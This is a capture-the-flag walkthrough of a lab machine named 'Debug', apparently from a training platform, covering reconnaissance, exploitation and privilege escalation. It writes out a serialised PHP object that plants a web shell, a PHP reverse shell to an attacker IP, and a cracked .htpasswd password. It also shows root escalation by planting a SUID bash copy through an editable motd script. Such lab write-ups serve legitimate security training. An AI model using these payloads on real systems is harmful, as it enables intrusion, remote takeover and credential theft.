Debug

Target IP: 10.10.76.163
Challenge Description:

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.76.163 -p- returns the result shown above. There are only two TCP ports open on the target machine: SSH and HTTP on their standard ports. Time to perform an aggressive scan against these two ports.


I ran the command sudo nmap -sV -A 10.10.76.163 -p 22,80 to perform an aggressive scan against the two ports and obtained the result shown above. The web application on port 80 seems to be returning the default Apache page. I will begin my enumeration on port 80 first.


I performed a scan against the web server by using the command nikto -h http://10.10.76.163 and obtained the result shown above. The scan successfully found an interesting directory with the name /backup. Other than that, the scan seems to be normal. Time to enumerate this application further.

Enumeration

Port 80: HTTP

The default Apache webpage shown above is returned for this web application. I viewed the source-code of this webpage, but I did not find anything useful such as developer comments. Time to perform a directory search now.


I performed a directory search using the command feroxbuster -u http://10.10.76.163 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak -r and obtained the result shown above. This scan successfully found interesting files and directories such as message.txt, /backup, etc.


I browsed to http://10.10.76.163/backup and the webpage shown above was returned to me. Right away, I notice two interesting files: index.html.bak and index.php.bak. These are backup files. Maybe I can read the contents of these files? I downloaded these two files on my machine.


I ran the command cat index.php.bak and obtained the crucial information shown above. This file index.php.bak is responsible for saving the message from name, email, and comments at http://10.10.76.163/index.php to a file called message.txt -- which is also accessible. The PHP function __destruct() is interesting as taking two parameters with the name message and form_file, and creating a file in the same directory. To exploit this appication, it is possible to write a PHP code to generate a malicious serialised object such as a web shell.


Before exploiting the web application, I tested the web application by filling in the form normally. Then I checked the content of the message.txt and obtained the result shown above. Time to run burpsuite and intercept the requests to test the debug parameter.

Exploitation

Owning the Web Application: Web Shell Upload via Insecure Deserialise PHP Object

<?php
class FormSubmit {
        public $form_file = 'shell.php';
        public $message = '<?php system($_GET["cmd"]); ?>';
}

$newObj = new FormSubmit;
echo serialize($newObj);

?>
<?php
class FormSubmit {
        public $form_file = 'shell.php';
        public $message = '<?php system($_GET["cmd"]); ?>';
}

$newObj = new FormSubmit;
echo serialize($newObj);

?>

This great website explains the attack in more depth. I created the PHP file with the same parameter names as the web application, as shown above. Then the object is serialised. This serialised object will be encoded in URL and passed to the web application to upload a web shell.


I executed the PHP code by running the command shell.php. Then I obtained the result, O:10:"FormSubmit":2:{s:9:"form_file";s:9:"shell.php";s:7:"message";s:30:"<?php system($_GET["cmd"]); ?>";}, as shown above. After URL encoding this new payload, it becomes O%3a10%3a"FormSubmit"%3a2%3a{s%3a9%3a"form_file"%3bs%3a9%3a"shell.php"%3bs%3a7%3a"message"%3bs%3a30%3a"<%3fphp+system($_GET["cmd"])%3b+%3f>"%3b}. Time to deploy this new payload.


I started burpsuite and intercepted of the filling of the form. Then I added the parameter name debug with the URL encoded payload, as shown above in the left side of the image above. The full parameter name with the payload is O%3a10%3a"FormSubmit"%3a2%3a{s%3a9%3a"form_file"%3bs%3a9%3a"shell.php"%3bs%3a7%3a"message"%3bs%3a30%3a"<%3fphp+system($_GET["cmd"])%3b+%3f>"%3b}`. After sending the new malicious request, I obtained the HTTP response 200. Time to browse to http://10.10.76.163/shell.php to access my webshell.


And bingo. Now I have access to my webshell to perform RCE, as shown above. I successfully executed the commands ls;whoami;id and received the output shown above. Time to obtain a reverse shell connection now. I started a listener on my machine at port 8443.

Foothold: Deploying PHP Reverse Shell via PHP Webshell

I URL encoded the PHP reverse shell command php -r '$sock=fsockopen("10.14.55.153",8443);shell_exec("/bin/bash <&3 >&3 2>&3");' and obtained the result php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. Then I deployed this PHP reverse shell using my webshell. The full URL with the payload is http://10.10.76.163/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. After this, I managed to successfully obtain a foothold on the target machine as the user www-data as shown above. Then I upgraded my shell using the command python3 -c 'import pty; pty.spawn("/bin/bash")'.

Privilege Escalation

Horizontal Privilege Escalation: WWW-Data to James

After landing a shell on the target machine, I executed the command ls -la and noticed the file .htpasswd. Running the command cat .htpasswd returns james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1, as shown above. The encrypted hash belongs to the user james. I copied the encrypted hash $apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1 to a file called hash on my machine. Time to crack this hash.


I cracked the hash using john, as shown above. I ran the command john hash --wordlist=/usr/share/wordlists/rockyou.txt and obtained the password jamaica belonging to the user james. Is this user using this password on the machine too?


To switch user, I used the command su james and then entered the password jamaica as shown above. And bingo. I managed to successfully elevate my privileges horizontally from www-data to james.

Vertical Privilege Escalation: James to Root

I notice there is a file called Note-To-James.txt at the home directory of the user james left behind by the user root, and it contains the message shown above. This message mentions the user root has gave the user james permissions to modify files including the SSH welcome banner.


I ran the command find / -name "*motd*" 2>/dev/null to find these editable files. The entry /etc/update-motd.d stands out to me. I executed the command ls -la inside this directory and this user james has privileges over the files. I noticed the file 00-header is the SSH banner.


I edited the /etc/update-motd.d/00-header file using nano and made changes shown above. I tried to implant a reverse shell in the file, but it did not work. Instead, I decided to give a shell root privileges. The commands are cp /bin/bash /tmp/ to copy the bash shell to /tmp directory, and chmod u+s /tmp/bash to give higher privilege on the new copied bash shell over at /tmp directory. Time to SSH into the target machine again as the user james so the malicious code gets executed by the SSH header file.


And bingo. I reconnected to the target machine via SSH as the user james. I browsed to /tmp and noticed the /bin/bash shell has higher privileges. To use this new root shell, I used the command /tmp/bash -p. Now I have a root shell on the target machine as shown above.
